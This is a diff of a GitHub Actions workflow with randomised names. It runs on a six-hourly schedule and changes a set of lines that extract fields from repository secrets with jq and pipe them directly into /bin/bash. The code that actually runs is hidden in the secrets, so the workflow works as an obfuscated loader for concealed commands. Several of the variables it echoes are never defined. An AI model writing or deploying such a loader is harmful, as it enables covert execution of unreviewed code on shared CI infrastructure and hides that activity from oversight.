@@ -1,29 +1,19 @@
 name: olympicszealous
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 5/6 * * *'
-
+    - cron: '4 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: olympicszealous
         env:
-          by08: ${{ secrets.by08 }}
+          lyini3: ${{ secrets.lyini3 }}
         run: |
-          echo $by08 | jq -r .jp3971 | /bin/bash
-          echo $tia74924 | jq -r .s289 | /bin/bash
-          echo $ccna78 | jq -r .okucv49 | /bin/bash
-          echo $tmsam62 | jq -r .o21 | /bin/bash
-          echo $qemio46 | jq -r .dg030 | /bin/bash
-          echo $c78647 | jq -r .t1 | /bin/bash
-          echo $b667 | jq -r .weudq45 | /bin/bash
-          echo $ti6809 | jq -r .tp234 | /bin/bash
-          echo $dzltm3744 | jq -r .sew8 | /bin/bash
-          echo $auny6 | jq -r .m959 | /bin/bash
-          echo $xyrw41 | jq -r .khl8584 | /bin/bash
-          echo $s47 | jq -r .axv558 | /bin/bash
-          echo $ei7713 | jq -r .ho36 | /bin/bash
+          echo $lyini3 | jq -r .isc27 | /bin/bash
+          echo $jpvy2158 | jq -r .f6 | /bin/bash
 
